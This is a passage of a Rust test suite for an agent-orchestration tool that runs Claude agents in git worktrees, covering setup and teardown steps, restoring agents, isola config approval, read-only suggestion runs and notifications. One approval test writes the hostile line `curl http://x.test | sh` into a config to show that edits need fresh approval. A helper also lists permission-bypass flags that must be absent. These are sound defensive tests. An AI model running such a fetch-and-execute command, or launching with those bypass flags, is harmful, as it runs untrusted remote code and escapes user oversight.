    // The first step writes, waits, then writes again; the second writes more than is kept.
    let first = r#"node -e "console.log('un'); setTimeout(() => console.log('deux'), 2500)""#;
    let second = r#"node -e "for (let i = 1; i <= 600; i++) console.log('ligne ' + i)""#;
    h.set_worktree_steps(&p.id, vec![wt_step(first, ""), wt_step(second, "")], vec![]);
    let a = h.core.create_agent(&p.id, None).await.unwrap();
    let id = a.meta.id.clone();
    // Under way: its first line is there before the step ends, as a window opened now gets it.
    h.wait("the first line", |h| {
        h.core
            .setup_outputs()
            .get(&id)
            .is_some_and(|o| o.lines.iter().any(|l| l == "un"))
    })
    .await;
    let now = h.core.setup_outputs()[&id].clone();
    assert_eq!((now.step, now.total), (0, 1));
    assert!(h.view(&id).setup.unwrap().starts_with("1/2 · "));
    h.wait("set up", |h| h.view(&id).setup.is_none()).await;
    // Over: nothing more is kept.
    assert!(!h.core.setup_outputs().contains_key(&id));
    // The window was sent each step's lines as they came, a step starting with none (the window
    // forgets the lines of the step before), each batch counting the lines of its step so far and
    // carrying all of them since the batch before, up to the 500 the window keeps.
    let sent = setup_events(&h, &id);
    let batches = |step: u64| -> Vec<&(u64, u64, Vec<String>)> {
        sent.iter().filter(|(s, _, _)| *s == step).collect()
    };
    for step in [0, 1] {
        let batches = batches(step);
        assert_eq!(batches[0].1, 0, "{batches:?}");
        assert!(batches[0].2.is_empty(), "{batches:?}");
        let mut before = 0;
        for (_, total, lines) in &batches[1..] {
            assert!(*total > before, "{batches:?}");
            assert_eq!(lines.len() as u64, (*total - before).min(500));
            before = *total;
        }
    }
    let lines = |step: u64| -> Vec<String> {
        batches(step)
            .iter()
            .flat_map(|(_, _, l)| l.clone())
            .collect()
    };
    assert_eq!(lines(0), ["un", "deux"]);
    // The second's: the last lines written by each batch's count, the window left with the last 500.
    for (_, total, lines) in batches(1) {
        let from = *total as usize - lines.len() + 1;
        let written: Vec<String> = (from..=*total as usize)
            .map(|i| format!("ligne {i}"))
            .collect();
        assert_eq!(lines, &written);
    }
    assert_eq!(batches(1).last().unwrap().1, 600);
    let kept = lines(1);
    let expected: Vec<String> = (101..=600).map(|i| format!("ligne {i}")).collect();
    assert_eq!(kept[kept.len() - 500..], expected[..]);
    // The log has every line of every step, under its label.
    let log = std::fs::read_to_string(h.core.data.setup_log(&id)).unwrap();
    let label = |i: usize, c: &str| {
        format!(
            "── {}/2 · {}\n",
            i,
            crate::worktrees::label(&wt_step(c, ""))
        )
    };
    assert!(log.starts_with(&label(1, first)), "{log}");
    assert!(
        log.contains(&format!("{}un\ndeux\n── terminée en ", label(1, first))),
        "{log}"
    );
    assert!(
        log.contains(&format!("{}ligne 1\nligne 2\n", label(2, second))),
        "{log}"
    );
    assert!(log.contains("ligne 600\n── terminée en "), "{log}");
}

#[tokio::test]
async fn the_window_gets_a_steps_lines_in_a_few_batches_however_many_writes_it_makes() {
    let h = harness("wt-setup-batches");
    let (p, _) = h.project(true).await;
    // 120 lines, each written on its own a little after the one before: as many reads.
    let chatty = r#"node -e "let i = 0; const t = setInterval(() => { console.log('ligne ' + ++i); if (i === 120) clearInterval(t); }, 8)""#;
    h.set_worktree_steps(&p.id, vec![wt_step(chatty, "")], vec![]);
    let started = std::time::Instant::now();
    let a = h.core.create_agent(&p.id, None).await.unwrap();
    let id = a.meta.id.clone();
    h.wait("set up", |h| h.view(&id).setup.is_none()).await;
    let elapsed = started.elapsed();
    let sent = setup_events(&h, &id);
    // Nothing lost, in order, the totals counting them.
    let lines: Vec<String> = sent.iter().flat_map(|(_, _, l)| l.clone()).collect();
    let expected: Vec<String> = (1..=120).map(|i| format!("ligne {i}")).collect();
    assert_eq!(lines, expected);
    assert_eq!(sent.last().unwrap().1, 120);
    // One batch every 50 ms at most, and the last at the step's end: not one per write.
    let batches = sent.iter().filter(|(_, _, l)| !l.is_empty()).count();
    let bound = (elapsed.as_millis() / 50) as usize + 2;
    assert!(batches <= bound, "{batches} batches in {elapsed:?}");
}

#[tokio::test]
async fn a_failed_setup_is_said_and_stops_there_but_the_agent_still_works() {
    let h = harness("wt-setup-fail");
    let (p, _) = h.project(true).await;
    h.set_worktree_steps(
        &p.id,
        vec![
            wt_step(
                r#"node -e "console.log('npm ERR! introuvable'); process.exit(2)""#,
                "",
            ),
            wt_step(
                r#"node -e "require('fs').writeFileSync('never.txt', '')""#,
                "",
            ),
        ],
        vec![],
    );
    let a = h.core.create_agent(&p.id, None).await.unwrap();
    let id = a.meta.id.clone();
    let dir = PathBuf::from(a.meta.worktree.unwrap().path);
    h.turn(&id, "Bonjour").await;
    let warns = h.notices(&id, "warn");
    assert_eq!(warns.len(), 1, "{warns:?}");
    assert!(
        warns[0].starts_with("La préparation du worktree a échoué sur `node -e")
            && warns[0].contains("(code 2).")
            && warns[0].contains("npm ERR! introuvable"),
        "{}",
        warns[0]
    );
    // The conversation says where the whole output is; the log says how the step ended.
    let log = h.core.data.setup_log(&id);
    assert!(
        warns[0].ends_with(&format!("\n\nSortie complète : {}", log.display())),
        "{}",
        warns[0]
    );
    let text = std::fs::read_to_string(&log).unwrap();
    assert!(
        text.contains("npm ERR! introuvable\n── échec : code 2\n"),
        "{text}"
    );
    assert!(!dir.join("never.txt").exists());
    assert_eq!(h.view(&id).setup, None);
    assert!(!h.core.setup_outputs().contains_key(&id));
}

#[tokio::test]
async fn an_agent_without_a_worktree_is_not_set_up() {
    let h = harness("wt-setup-none");
    let (p, _) = h.project(false).await;
    h.set_worktree_steps(
        &p.id,
        vec![wt_step(r#"node -e "process.exit(1)""#, "")],
        vec![],
    );
    let a = h.core.create_agent(&p.id, None).await.unwrap();
    assert_eq!(a.setup, None);
    h.turn(&a.meta.id, "Bonjour").await;
    assert!(h.notices(&a.meta.id, "warn").is_empty());
}

#[tokio::test]
async fn deleting_an_agent_runs_the_teardown_in_its_worktree_before_removing_it() {
    let h = harness("wt-teardown");
    let (p, r) = h.project(true).await;
    h.set_worktree_steps(
        &p.id,
        vec![],
        vec![
            wt_step(
                r#"node -e "const fs = require('fs'); fs.writeFileSync(require('path').join(process.env.ESCOUADE_PROJECT_DIR, 'down.txt'), process.env.ESCOUADE_BRANCH + ' ' + fs.existsSync('src'))""#,
                "",
            ),
            wt_step(r#"node -e "process.exit(4)""#, ""),
            wt_step(
                r#"node -e "require('fs').writeFileSync(require('path').join(process.env.ESCOUADE_PROJECT_DIR, 'after.txt'), '')""#,
                "",
            ),
        ],
    );
    let a = h.core.create_agent(&p.id, None).await.unwrap();
    let wt = a.meta.worktree.clone().unwrap();
    let warning = h.core.delete_agent(&a.meta.id, true).await.unwrap();
    // Run in the worktree while it was still there, every step even after one failed.
    assert_eq!(
        std::fs::read_to_string(r.join("down.txt")).unwrap(),
        format!("{} true", wt.branch)
    );
    assert!(r.join("after.txt").exists());
    assert_eq!(
        warning.as_deref(),
        Some("Agent supprimé, mais le démontage du worktree a échoué sur `node -e \"process.exit(4)\"` (code 4).")
    );
    // Removed all the same.
    assert!(!Path::new(&wt.path).exists());
    assert_eq!(git(&r, &["branch", "--list", &wt.branch]), "");
}

#[tokio::test]
async fn deleting_an_agent_but_not_its_worktree_runs_no_teardown() {
    let h = harness("wt-teardown-kept");
    let (p, r) = h.project(true).await;
    h.set_worktree_steps(
        &p.id,
        vec![],
        vec![wt_step(
            r#"node -e "require('fs').writeFileSync(require('path').join(process.env.ESCOUADE_PROJECT_DIR, 'down.txt'), '')""#,
            "",
        )],
    );
    let a = h.core.create_agent(&p.id, None).await.unwrap();
    let wt = a.meta.worktree.clone().unwrap();
    assert_eq!(h.core.delete_agent(&a.meta.id, false).await.unwrap(), None);
    assert!(Path::new(&wt.path).is_dir() && !r.join("down.txt").exists());
}

#[tokio::test]
async fn deleting_an_agent_stops_the_setup_of_its_worktree() {
    // How long the setup command would take on its own: far more than the deletion needs, so that
    // what is asserted holds on a loaded machine too (it compares with this, not with a clock).
    const DELAY_MS: u64 = 20_000;
    let h = harness("wt-setup-stop");
    let (p, r) = h.project(true).await;
    // Says it is under way (its process id), then would write `late.txt` once the delay is over.
    let command = format!(
        r#"node -e "const fs = require('fs'), path = require('path'); const dir = process.env.ESCOUADE_PROJECT_DIR; fs.writeFileSync(path.join(dir, 'started.txt'), String(process.pid)); setTimeout(() => fs.writeFileSync(path.join(dir, 'late.txt'), ''), {DELAY_MS})""#
    );
    h.set_worktree_steps(&p.id, vec![wt_step(&command, "")], vec![]);
    let a = h.core.create_agent(&p.id, None).await.unwrap();
    let wt = a.meta.worktree.clone().unwrap();
    // Under way: its process really started, whatever time that takes.
    let pid_of = || -> Option<u32> {
        std::fs::read_to_string(r.join("started.txt"))
            .ok()?
            .trim()
            .parse()
            .ok()
    };
    h.wait("its setup started", |_| pid_of().is_some()).await;
    let pid = pid_of().unwrap();
    assert!(process_exists(pid));
    let log = h.core.data.setup_log(&a.meta.id);
    assert!(log.is_file());
    let started = std::time::Instant::now();
    assert_eq!(h.core.delete_agent(&a.meta.id, true).await.unwrap(), None);
    let took = started.elapsed();
    // Its log goes with it, and its worktree.
    assert!(!log.exists());
    assert!(!Path::new(&wt.path).exists());
    // It did not wait for the command to end on its own (which takes DELAY_MS after it started).
    assert!(
        took < Duration::from_millis(DELAY_MS / 2),
        "deleted in {took:?}, the setup would have ended by itself in {DELAY_MS} ms"
    );
    // Killed with it, long before its delay: it never ends its work.
    let deadline = std::time::Instant::now() + Duration::from_secs(15);
    while process_exists(pid) {
        assert!(
            std::time::Instant::now() < deadline,
            "the setup's process {pid} survived the agent"
        );
        tokio::time::sleep(Duration::from_millis(50)).await;
    }
    assert!(!r.join("late.txt").exists());
}

#[tokio::test]
async fn an_archived_agent_whose_worktree_went_gets_it_back_from_its_branch_when_restored() {
    let h = harness("wt-restore");
    let (p, r) = h.project(true).await;
    ignore(&r, ".env");
    std::fs::write(r.join(".env"), "SECRET=1\n").unwrap();
    let a = h.core.create_agent(&p.id, None).await.unwrap();
    let id = a.meta.id.clone();
    let wt = a.meta.worktree.clone().unwrap();
    let dir = PathBuf::from(&wt.path);
    std::fs::write(dir.join("travail.txt"), "fait\n").unwrap();
    git(&dir, &["add", "travail.txt"]);
    git(&dir, &["commit", "-qm", "travail"]);
    h.wait("warm-up", |h| h.alive(&id)).await;
    let held = h.core.agent(&id).unwrap().lock().proc.clone().unwrap();
    h.core.archive_agent(&id, true).await.unwrap();
    h.wait("its process over", |_| !held.is_alive()).await;
    // Its folder went (as after a pull request or a push), its branch stayed.
    remove_worktree_eventually(&r, &wt.path).await;
    h.set_worktree_steps(
        &p.id,
        vec![wt_step(
            r#"node -e "require('fs').writeFileSync('prepared.txt', '')""#,
            "",
        )],
        vec![],
    );
    h.core.archive_agent(&id, false).await.unwrap();
    assert_eq!(
        std::fs::read_to_string(dir.join("travail.txt")).unwrap(),
        "fait\n"
    );
    assert_eq!(git(&dir, &["rev-parse", "--abbrev-ref", "HEAD"]), wt.branch);
    assert_eq!(
        std::fs::read_to_string(dir.join(".env")).unwrap(),
        "SECRET=1\n"
    );
    // Set up again before it takes a message.
    h.turn(&id, "Reprends").await;
    assert!(dir.join("prepared.txt").exists());
    // Without its branch (merged and deleted), it stays as it is.
    h.core.archive_agent(&id, true).await.unwrap();
    remove_worktree_eventually(&r, &wt.path).await;
    git(&r, &["branch", "-D", &wt.branch]);
    h.core.archive_agent(&id, false).await.unwrap();
    assert!(!dir.exists());
}

#[tokio::test]
async fn a_restored_agent_whose_folder_another_worktree_took_gets_its_own_beside_it() {
    let h = harness("wt-restore-taken");
    let (p, r) = h.project(true).await;
    let a = h.core.create_agent(&p.id, None).await.unwrap();
    let id = a.meta.id.clone();
    let wt = a.meta.worktree.clone().unwrap();
    h.wait("warm-up", |h| h.alive(&id)).await;
    let held = h.core.agent(&id).unwrap().lock().proc.clone().unwrap();
    h.core.archive_agent(&id, true).await.unwrap();
    h.wait("its process over", |_| !held.is_alive()).await;
    remove_worktree_eventually(&r, &wt.path).await;
    // Its folder is another repository's worktree now (a folder of worktrees two projects share).
    let other = PathBuf::from(&wt.path);
    std::fs::create_dir_all(&other).unwrap();
    git(&other, &["init", "-q", "-b", "autre"]);
    h.core.archive_agent(&id, false).await.unwrap();
    let back = h.agent(&id);
    let own = back.worktree.clone().unwrap();
    let beside = format!("{}-2", wt.path);
    assert_eq!(own.path, beside);
    assert_eq!(back.cwd, beside);
    assert_eq!(
        git(Path::new(&beside), &["rev-parse", "--abbrev-ref", "HEAD"]),
        wt.branch
    );
    // The other one is as it was, and the agent says where it works now.
    assert_eq!(git(&other, &["symbolic-ref", "--short", "HEAD"]), "autre");
    assert_eq!(
        h.notices(&id, "warn"),
        [format!(
            "Le dossier {} est pris par un autre worktree : celui de l'agent est recréé dans {beside}.",
            wt.path
        )]
    );
}

#[tokio::test]
async fn the_worktrees_out_of_the_projects_folder_are_watched_too() {
    let h = harness("own-worktrees-watched");
    let (p, r) = h.project(true).await;
    // In the project's folder: its watch sees them.
    h.core.create_agent(&p.id, None).await.unwrap();
    assert_eq!(h.core.watched_folders(&p), vec![p.path.clone()]);
    h.core
        .update_project(Project {
            worktree_dir: "../repo-wt".into(),
            ..p.clone()
        })
        .unwrap();
    let p = h.core.project(&p.id).unwrap();
    // Not made yet: nothing more to watch.
    assert_eq!(h.core.watched_folders(&p), vec![p.path.clone()]);
    h.core.create_agent(&p.id, None).await.unwrap();
    let beside = r.parent().unwrap().join("repo-wt");
    assert_eq!(
        h.core.watched_folders(&p),
        [p.path.clone(), beside.to_string_lossy().into_owned()]
    );
}

// ---------- isola ----------

#[tokio::test]
async fn an_isola_worktree_is_listed_stopped_and_torn_down_by_isola() {
    crate::isola::tests::use_fake();
    let h = harness("wt-isola");
    let (p, r) = h.project(true).await;
    std::fs::write(
        r.join(".isola.toml"),
        "[services.web]\ncommand = \"npm run dev\"\n",
    )
    .unwrap();
    git(&r, &["add", "-A"]);
    git(&r, &["commit", "-qm", "isola"]);
    ignore(&r, ".isola-*");
    let a = h.core.create_agent(&p.id, None).await.unwrap();
    let id = a.meta.id.clone();
    let wt = a.meta.worktree.clone().unwrap();
    let dir = PathBuf::from(&wt.path);
    assert!(a.isola);
    // Up (the test launch runs `isola up` in a terminal), its services are the worktree's.
    assert!(h.core.isola_services(&id).await.unwrap().is_empty());
    crate::isola::run(&wt.path, &["up"], crate::isola::LIMIT)
        .await
        .unwrap();
    let services = h.core.isola_services(&id).await.unwrap();
    assert_eq!(
        (
            services.len(),
            services[0].name.as_str(),
            services[0].url.as_str(),
            services[0].probe.as_str()
        ),
        (
            1,
            "web",
            "http://escouade-agent-1.demo.localhost:3000",
            "http://127.0.0.1:9"
        )
    );
    h.core.isola_down(&id).await.unwrap();
    assert!(h.core.isola_services(&id).await.unwrap().is_empty());
    // Its test launch is isola's: `isola up` in the worktree, once its configuration is approved.
    let config = h.core.isola_config(&id).unwrap();
    h.core.approve_isola(&id, config, String::new()).unwrap();
    let spec = h.core.test_run_spec(&id, "isola", 0).unwrap();
    assert_eq!(
        (spec.command.as_str(), spec.cwd.as_str()),
        (crate::isola::UP, wt.path.as_str())
    );
    // Archived, its services stop.
    crate::isola::run(&wt.path, &["up"], crate::isola::LIMIT)
        .await
        .unwrap();
    h.core.archive_agent(&id, true).await.unwrap();
    h.wait("isola down", |_| {
        crate::isola::tests::calls(&dir).last().map(String::as_str) == Some("down")
    })
    .await;
    // Deleted with its worktree, isola tears it down first.
    h.core.archive_agent(&id, false).await.unwrap();
    assert_eq!(h.core.delete_agent(&id, true).await.unwrap(), None);
    assert_eq!(
        crate::isola::tests::calls(&dir).last().map(String::as_str),
        Some("destroy")
    );
    assert!(!dir.exists());
}

#[tokio::test]
async fn closing_a_project_stops_its_worktrees_setups_and_isolas_services() {
    crate::isola::tests::use_fake();
    let h = harness("wt-close");
    let (p, r) = h.project(true).await;
    std::fs::write(r.join(".isola.toml"), "").unwrap();
    git(&r, &["add", "-A"]);
    git(&r, &["commit", "-qm", "isola"]);
    ignore(&r, ".isola-*");
    h.set_worktree_steps(
        &p.id,
        vec![wt_step(
            r#"node -e "setTimeout(() => require('fs').writeFileSync(require('path').join(process.env.ESCOUADE_PROJECT_DIR, 'late.txt'), ''), 4000)""#,
            "",
        )],
        vec![],
    );
    let a = h.core.create_agent(&p.id, None).await.unwrap();
    let dir = PathBuf::from(a.meta.worktree.clone().unwrap().path);
    tokio::time::sleep(Duration::from_millis(800)).await;
    h.core.remove_project(&p.id, true).await.unwrap();
    h.wait("isola down", |_| {
        crate::isola::tests::calls(&dir).last().map(String::as_str) == Some("down")
    })
    .await;
    // Its setup was stopped with the project: it never ends its work. Its log went with it.
    tokio::time::sleep(Duration::from_secs(5)).await;
    assert!(!r.join("late.txt").exists());
    assert!(!h.core.data.setup_log(&a.meta.id).exists());
}

#[tokio::test]
async fn a_worktree_without_isolas_configuration_is_not_isolas() {
    crate::isola::tests::use_fake();
    let h = harness("wt-isola-none");
    let (p, _) = h.project(true).await;
    let a = h.core.create_agent(&p.id, None).await.unwrap();
    assert!(!a.isola);
    assert!(h.core.isola_services(&a.meta.id).await.is_err());
    assert!(h.core.test_run_spec(&a.meta.id, "isola", 0).is_err());
    let dir = PathBuf::from(a.meta.worktree.clone().unwrap().path);
    h.core.delete_agent(&a.meta.id, true).await.unwrap();
    assert!(crate::isola::tests::calls(&dir).is_empty());
}

#[tokio::test]
async fn an_isola_launch_runs_only_the_configuration_the_user_approved() {
    crate::isola::tests::use_fake();
    let h = harness("wt-isola-approval");
    let (p, r) = h.project(true).await;
    std::fs::write(
        r.join(".isola.toml"),
        "[services.web]\ncommand = \"npm run dev\"\n",
    )
    .unwrap();
    git(&r, &["add", "-A"]);
    git(&r, &["commit", "-qm", "isola"]);
    ignore(&r, ".isola-*");
    let a = h.core.create_agent(&p.id, None).await.unwrap();
    let id = a.meta.id.clone();
    let wt = a.meta.worktree.clone().unwrap();
    let config_path = PathBuf::from(&wt.path).join(".isola.toml");
    assert!(a.isola);

    // `isola up` runs the commands of this file, which the agent can write: nothing runs unread.
    let refused = |h: &Harness| {
        h.core
            .test_run_spec(&id, "isola", 0)
            .unwrap_err()
            .to_string()
    };
    assert_eq!(
        refused(&h),
        crate::testlaunch::isola_not_approved(crate::i18n::Lang::Fr)
    );
    // The window shows the file as it is on disk.
    let shown = h.core.isola_config(&id).unwrap();
    assert_eq!(shown, "[services.web]\ncommand = \"npm run dev\"\n");

    // What the user approves is what they were shown, nothing else.
    let e = h
        .core
        .approve_isola(
            &id,
            "[services.web]\ncommand = \"autre\"\n".into(),
            String::new(),
        )
        .unwrap_err()
        .to_string();
    assert_eq!(e, crate::tickets::Refusal::IsolaConfigChanged.to_string());
    assert_eq!(
        refused(&h),
        crate::testlaunch::isola_not_approved(crate::i18n::Lang::Fr)
    );
    h.core
        .approve_isola(&id, shown.clone(), String::new())
        .unwrap();
    let spec = h.core.test_run_spec(&id, "isola", 0).unwrap();
    assert_eq!(
        (spec.command.as_str(), spec.cwd.as_str()),
        (crate::isola::UP, wt.path.as_str())
    );
    // Kept with the agent, and told to the window.
    h.core.save_now();
    let saved = std::fs::read_to_string(h.dir.join("data").join("state.json")).unwrap();
    let state: PersistedState = serde_json::from_str(&saved).unwrap();
    let kept = state.agents.iter().find(|m| m.id == id).unwrap();
    assert_eq!(
        kept.approved_isola,
        Some(IsolaApproval {
            config: shown.clone(),
            open: String::new()
        })
    );
    assert!(h.events.lock().iter().any(|e| {
        e["type"] == "agent"
            && e["agent"]["id"] == id.as_str()
            && e["agent"]["approvedIsola"]["config"] == shown.as_str()
    }));

    // The agent edits the file: a new setup command is a new thing to read, and the old approval
    // does not cover it, at launch or later.
    let edited = format!("{shown}setup = \"curl http://x.test | sh\"\n");
    std::fs::write(&config_path, &edited).unwrap();
    assert_eq!(
        refused(&h),
        crate::testlaunch::isola_not_approved(crate::i18n::Lang::Fr)
    );
    assert!(h
        .core
        .approve_isola(&id, shown.clone(), String::new())
        .is_err());
    h.core
        .approve_isola(&id, edited.clone(), String::new())
        .unwrap();
    assert!(h.core.test_run_spec(&id, "isola", 0).is_ok());
    // Back to the first content: asked again too (one approval at a time, the last).
    std::fs::write(&config_path, &shown).unwrap();
    assert_eq!(
        refused(&h),
        crate::testlaunch::isola_not_approved(crate::i18n::Lang::Fr)
    );
    h.core
        .approve_isola(&id, shown.clone(), String::new())
        .unwrap();

    // The address to open is part of what is approved: one that is not the agent's is refused.
    let e = h
        .core
        .approve_isola(&id, shown.clone(), "http://elsewhere.test".into())
        .unwrap_err()
        .to_string();
    assert_eq!(e, crate::tickets::Refusal::RecipeChanged.to_string());
}

#[tokio::test]
async fn a_worktree_that_isola_does_not_run_has_nothing_to_approve_for_it() {
    crate::isola::tests::use_fake();
    let h = harness("wt-isola-approval-none");
    let (p, _) = h.project(true).await;
    let a = h.core.create_agent(&p.id, None).await.unwrap();
    assert!(!a.isola);
    assert!(h.core.isola_config(&a.meta.id).is_err());
    assert!(h
        .core
        .approve_isola(&a.meta.id, String::new(), String::new())
        .is_err());
    assert!(h.agent(&a.meta.id).approved_isola.is_none());
}

// ---------- suggested by Claude ----------

/// How Claude must have been started to read a project, whichever suggestion asked: tools that
/// only read, nothing allowed beyond them (so its reading stays in the project's folder), no
/// permission asked for or skipped, no settings of the user's, no MCP server.
fn assert_reads_only(argv: &[String]) {
    let after = |flag: &str| {
        let at = argv
            .iter()
            .position(|a| a == flag)
            .unwrap_or_else(|| panic!("{flag} missing in {argv:?}"));
        argv[at + 1].clone()
    };
    assert_eq!(after("--tools"), "Read,Glob,Grep");
    assert_eq!(after("--setting-sources"), "");
    assert!(
        argv.contains(&"--strict-mcp-config".to_string()),
        "{argv:?}"
    );
    for flag in [
        "--allowedTools",
        "--allowed-tools",
        "--permission-mode",
        "--dangerously-skip-permissions",
        "--allow-dangerously-skip-permissions",
        "--add-dir",
        "--mcp-config",
    ] {
        assert!(!argv.iter().any(|a| a == flag), "{flag} in {argv:?}");
    }
    assert!(
        !argv
            .iter()
            .any(|a| a.contains("Bash") || a.contains("Edit")),
        "{argv:?}"
    );
}

#[tokio::test]
async fn claude_reads_the_project_with_read_only_tools_to_suggest_its_worktree_commands() {
    let h = harness("wt-suggest-claude");
    let (p, r) = h.project(false).await;
    let s = h.core.suggest_worktree_steps(&p.id).await.unwrap();
    let setup: Vec<(&str, &str)> = s
        .setup
        .iter()
        .map(|x| (x.command.as_str(), x.cwd.as_str()))
        .collect();
    // The step whose folder leaves the project is dropped; the one that holds a line break is
    // refused, and counted.
    assert_eq!(setup, [("npm ci", ""), ("npm run gen", "src")]);
    assert_eq!(s.refused, 1);
    assert_eq!(s.teardown.len(), 1);
    assert_eq!(s.teardown[0].command, "docker compose down");
    let first = crate::pty::detect_shells(&h.core.settings.read())
        .first()
        .map(|s| s.id.clone())
        .unwrap();
    assert!(s.setup.iter().chain(&s.teardown).all(|x| x.shell == first));
    // Run in the project, with nothing but tools that read.
    assert_reads_only(&h.launches(&r).pop().expect("claude run in the project"));
    let sent = serde_json::to_value(&s).unwrap();
    assert_eq!(sent["setup"][1]["cwd"], "src");
    assert_eq!(sent["refused"], 1);
}

#[tokio::test]
async fn claude_reads_a_folder_not_made_a_project_yet_for_the_new_projects_assistant() {
    let h = harness("wt-suggest-at");
    let (_, r) = h.project(false).await;
    let dir = r.to_string_lossy().to_string();
    // Its folder alone, written with a separator at the end, as the assistant may have it.
    let s = h
        .core
        .suggest_worktree_steps_at(&format!("{dir}/"))
        .await
        .unwrap();
    assert_eq!((s.setup.len(), s.refused), (2, 1));
    assert_reads_only(&h.launches(&r).pop().expect("claude run in the folder"));
    let run = h.core.suggest_run_commands_at(&dir).await.unwrap();
    assert!(!run.commands.is_empty());
    let missing = h
        .core
        .suggest_run_commands_at(&format!("{dir}-absent"))
        .await
        .unwrap_err()
        .to_string();
    assert!(missing.contains("n'existe pas"), "{missing}");
}

#[tokio::test]
async fn claude_is_asked_for_the_commands_of_a_project_in_the_language_of_the_texts_for_claude() {
    use crate::i18n::Lang::En;
    use crate::worktrees::{run_suggest_system, suggest_system};
    let h = harness("suggest-en");
    let (p, r) = h.project(false).await;
    h.core.settings.write().claude_language = "en".into();
    // Its role, as the last question asked in the project gave it.
    let system = |h: &Harness| {
        let argv = h.launches(&r).pop().expect("claude run in the project");
        let at = argv.iter().position(|a| a == "--system-prompt").unwrap();
        argv[at + 1].clone()
    };
    let steps = h.core.suggest_worktree_steps(&p.id).await.unwrap();
    assert_eq!(system(&h), suggest_system(En));
    assert_eq!((steps.setup.len(), steps.refused), (2, 1));
    // The fake Claude read the English question as the French one.
    let run = h.core.suggest_run_commands(&p.id).await.unwrap();
    assert_eq!(system(&h), run_suggest_system(En));
    let names: Vec<&str> = run.commands.iter().map(|c| c.name.as_str()).collect();
    assert_eq!((names, run.refused), (vec!["Front", "API"], 1));
}

#[tokio::test]
async fn worktree_commands_that_were_all_refused_are_told_so_and_not_as_nothing_found() {
    let h = harness("wt-suggest-all-refused");
    let (p, _) = h.project(false).await;
    let e = h
        .core
        .suggest_worktree_steps(&p.id)
        .await
        .unwrap_err()
        .to_string();
    assert_eq!(
        e,
        "Claude a proposé des commandes illisibles : aucune n'a été gardée."
    );
}

#[tokio::test]
async fn claude_reads_the_project_with_read_only_tools_to_suggest_its_launch_commands() {
    let h = harness("run-suggest-claude");
    let (p, r) = h.project(false).await;
    let suggestion = h.core.suggest_run_commands(&p.id).await.unwrap();
    let shown: Vec<(&str, &str, &str)> = suggestion
        .commands
        .iter()
        .map(|c| (c.name.as_str(), c.command.as_str(), c.cwd.as_str()))
        .collect();
    // The commands whose folder leaves the project, or is not in it, are dropped; the one that
    // holds a line break is refused, and counted.
    assert_eq!(
        shown,
        [("Front", "npm run dev", "src"), ("API", "cargo run", "")]
    );
    assert_eq!(suggestion.refused, 1);
    let first = crate::pty::detect_shells(&h.core.settings.read())
        .first()
        .map(|s| s.id.clone())
        .unwrap();
    assert!(suggestion
        .commands
        .iter()
        .all(|c| c.shell == first && !c.id.is_empty()));
    // Run in the project, with nothing but tools that read.
    assert_reads_only(&h.launches(&r).pop().expect("claude run in the project"));
    let sent = serde_json::to_value(&suggestion).unwrap();
    assert_eq!(sent["commands"][0]["cwd"], "src");
    assert_eq!(sent["refused"], 1);
    // Only a suggestion: the project keeps its commands until the user saves.
    assert!(h.core.project(&p.id).unwrap().run_commands.is_empty());
}

#[tokio::test]
async fn launch_commands_that_were_all_refused_are_told_so_and_not_as_nothing_found() {
    let h = harness("run-suggest-all-refused");
    let (p, _) = h.project(false).await;
    let e = h
        .core
        .suggest_run_commands(&p.id)
        .await
        .unwrap_err()
        .to_string();
    assert_eq!(
        e,
        "Claude a proposé des commandes illisibles : aucune n'a été gardée."
    );
}

#[tokio::test]
async fn an_answer_without_launch_commands_in_json_is_told_as_unreadable() {
    let h = harness("run-suggest-unreadable");
    let (p, _) = h.project(false).await;
    let e = h
        .core
        .suggest_run_commands(&p.id)
        .await
        .unwrap_err()
        .to_string();
    assert_eq!(e, "Claude n'a pas proposé de commandes lisibles.");
}

#[tokio::test]
async fn a_kind_of_notification_switched_off_is_not_sent_but_the_others_are() {
    let h = harness("notify-kinds");
    let kinds = [
        NotifyKind::Question,
        NotifyKind::Done,
        NotifyKind::Error,
        NotifyKind::Ticket,
    ];
    for off in kinds {
        h.core.alerts.lock().clear();
        {
            let mut s = h.core.settings.write();
            s.notify_for = NotifyFor::default();
            match off {
                NotifyKind::Question => s.notify_for.questions = false,
                NotifyKind::Done => s.notify_for.done = false,
                NotifyKind::Error => s.notify_for.errors = false,
                NotifyKind::Ticket => s.notify_for.tickets = false,
            }
        }
        for kind in kinds {
            h.core.alert(
                kind,
                "demo".into(),
                format!("{kind:?}"),
                UiEvent::FocusBoard {
                    project_id: "p1".into(),
                },
            );
        }
        let sent = h.alerts();
        let expected: Vec<String> = kinds
            .iter()
            .filter(|k| **k != off)
            .map(|k| format!("demo | {k:?}"))
            .collect();
        assert_eq!(sent, expected, "with {off:?} off");
    }
}

#[tokio::test]
async fn a_question_or_a_permission_is_told_with_its_own_words() {
    let h = harness("notify-asks");
    let (p, _) = h.project(false).await;
    let asking = h.core.create_agent(&p.id, None).await.unwrap().meta.id;
    h.core
        .send_message(&asking, "question".into(), vec![])
        .await
        .unwrap();
    h.wait_alerts(1).await;
    assert!(
        h.alerts()[0].ends_with(" | Quelle base de données ?"),
        "{:?}",
        h.alerts()
    );
    let asked = h.core.create_agent(&p.id, None).await.unwrap().meta.id;
    h.core
        .send_message(&asked, "permission".into(), vec![])
        .await
        .unwrap();
    h.wait_alerts(2).await;
    assert!(
        h.alerts()[1].ends_with(" | Autoriser Bash : rm -rf build ?"),
        "{:?}",
        h.alerts()
    );
}

#[tokio::test]
async fn the_end_of_a_turn_and_a_crash_are_told_unless_their_kind_is_off() {
    let h = harness("notify-ends");
    let (p, _) = h.project(false).await;
    let id = h.core.create_agent(&p.id, None).await.unwrap().meta.id;
    h.turn(&id, "Bonjour").await;
    h.wait_alerts(1).await;
    // Titled with the project and the agent (named by Claude meanwhile), saying the first line
    // of the reply.
    let sent = h.alerts();
    assert!(
        sent.len() == 1
            && sent[0].starts_with("demo · ")
            && sent[0].ends_with(" | Bonjour, tu as dit : Bonjour"),
        "{sent:?}"
    );

    // Ends and errors off: the next turn and a crash are silent, though a question still is.
    {
        let mut s = h.core.settings.write();
        s.notify_for.done = false;
        s.notify_for.errors = false;
    }
    h.turn(&id, "Encore").await;
    h.core
        .send_message(&id, "crash".into(), vec![])
        .await
        .unwrap();
    h.wait("crash", |h| h.agent(&id).status == AgentStatus::Error)
        .await;
    let asking = h.core.create_agent(&p.id, None).await.unwrap().meta.id;
    h.core
        .send_message(&asking, "question".into(), vec![])
        .await
        .unwrap();
    h.wait_alerts(2).await;
    let sent = h.alerts();
